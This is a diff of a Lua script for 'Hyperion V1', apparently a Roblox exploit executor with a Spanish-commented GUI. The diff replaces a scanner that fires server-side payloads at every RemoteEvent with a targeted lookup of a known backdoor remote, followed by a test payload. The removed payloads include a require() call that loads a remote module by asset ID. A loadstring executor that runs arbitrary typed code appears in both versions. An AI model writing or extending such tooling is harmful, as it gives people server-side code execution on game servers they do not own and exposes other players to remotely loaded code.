@@ -544,41 +544,64 @@ UICorner_19.Parent = BackgroundColor
 
 
 -------------------------------------------------------------------------
--- [ HYPERION V1 - BACKDOOR & HUB FIX ] --
+-- [ HYPERION V1 - DIRECT BACKDOOR DETECTION ] --
 -------------------------------------------------------------------------
 
-local TweenService = game:GetService("TweenService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
--- FIX DE VISIBILIDAD (Esconde todo excepto Hyperion y Scan al inicio)
-local function SetupGUI()
-    Hyperion.Enabled = true
-    Background.Visible = true
-    ScanPanel.Enabled = true
-    ExecutorPanel.Enabled = false
-    SettingsPanel.Enabled = false
-    BackgroundColorGui.Enabled = false
-end
-SetupGUI()
+-- 1. CONFIGURACIÓN DE INICIO
+Hyperion.Enabled = true
+ScanPanel.Enabled = true
+ExecutorPanel.Enabled = false
+SettingsPanel.Enabled = false
 
--- TOGGLE TOTAL (El logo esconde TODO el executor)
+-- 2. TOGGLE TOTAL (El logo cierra TODO)
 ToggleButton.MouseButton1Click:Connect(function()
     Hyperion.Enabled = not Hyperion.Enabled
 end)
 
--- NAVEGACIÓN
+-- 3. DETECCIÓN DIRECTA DE BACKDOOR
+-- Aquí definimos el nombre del remoto que suelen crear las backdoors (ej: "JointsService" o nombres invisibles)
+local BACKDOOR_NAME = "\201\134\201" -- Puedes cambiar esto por el nombre del remoto de la backdoor que conozcas
+
+ScanButton.MouseButton1Click:Connect(function()
+    ScanButton.Text = "CHECKING..."
+    task.wait(0.5)
+    
+    -- Buscamos directamente en los lugares típicos (JointsService es el más común)
+    local backdoor = game:GetService("JointsService"):FindFirstChild(BACKDOOR_NAME) or game:GetService("ReplicatedStorage"):FindFirstChild(BACKDOOR_NAME)
+    
+    if backdoor then
+        ScanButton.TextColor3 = Color3.fromRGB(0, 255, 127) -- Verde si la encuentra
+        ScanButton.Text = "BACKDOOR FOUND!"
+        
+        -- Payload para probar si responde el servidor
+        pcall(function()
+            backdoor:FireServer("print('Hyperion connected to Server-Side')")
+        end)
+    else
+        ScanButton.TextColor3 = Color3.fromRGB(255, 80, 80) -- Rojo si no hay nada
+        ScanButton.Text = "NOT FOUND"
+        task.wait(2)
+        ScanButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+        ScanButton.Text = "SCAN"
+    end
+end)
+
+-- 4. NAVEGACIÓN
 local function switchPanel(toEnable)
     ScanPanel.Enabled = false
     ExecutorPanel.Enabled = false
     SettingsPanel.Enabled = false
     toEnable.Enabled = true
 end
+
 ScanPanelButton.MouseButton1Click:Connect(function() switchPanel(ScanPanel) end)
 ExecutorPanelButton.MouseButton1Click:Connect(function() switchPanel(ExecutorPanel) end)
 SettingsPanelButton.MouseButton1Click:Connect(function() switchPanel(SettingsPanel) end)
 
--- FUNCIONALIDAD DEL EXECUTOR LOCAL
+-- 5. LÓGICA EXECUTOR LOCAL
 ExecuteButton.MouseButton1Click:Connect(function()
     local func, err = loadstring(Script.Text)
     if func then pcall(func) else warn("Error: "..err) end
@@ -588,40 +611,9 @@ ClearButton.MouseButton1Click:Connect(function()
     Script.Text = ""
 end)
 
--- SCANNER DE BACKDOORS (Server-Side Infiltrator)
-ScanButton.MouseButton1Click:Connect(function()
-    ScanButton.Text = "INFILTRATING..."
-    local found = 0
-    
-    -- El código que queremos que el servidor ejecute si hay backdoor
-    local payload = [[
-        print('Hyperion SS Loaded on Server!')
-        local s = Instance.new('Hint', workspace)
-        s.Text = 'This server has been scanned by Hyperion V1'
-        wait(5)
-        s:Destroy()
-    ]]
-
-    for _, v in ipairs(game:GetDescendants()) do
-        if v:IsA("RemoteEvent") then
-            found = found + 1
-            -- Intentamos "romper" el remoto enviando el payload
-            pcall(function()
-                v:FireServer(payload) -- Intento 1: Ejecución directa
-                v:FireServer("require(8345751336):Fire('"..LocalPlayer.Name.."')") -- Intento 2: Inyección de módulo
-            end)
-        end
-        if found % 100 == 0 then task.wait() end
-    end
-    
-    ScanButton.Text = "REMOTES: " .. found
-    task.wait(2)
-    ScanButton.Text = "SCAN"
-end)
-
--- INFO DE PERFIL
+-- 6. CARGAR PERFIL
 UserAvatar.Image = "rbxthumb://type=AvatarHeadShot&id="..LocalPlayer.UserId.."&w=100&h=100"
 WelcomeText.Text = "Welcome, " .. LocalPlayer.DisplayName
 UserId.Text = "ID: " .. LocalPlayer.UserId
 
-print("Hyperion V1: Logic and Backdoor Engine Active.")
+print("Hyperion V1: Direct Detection Ready.")
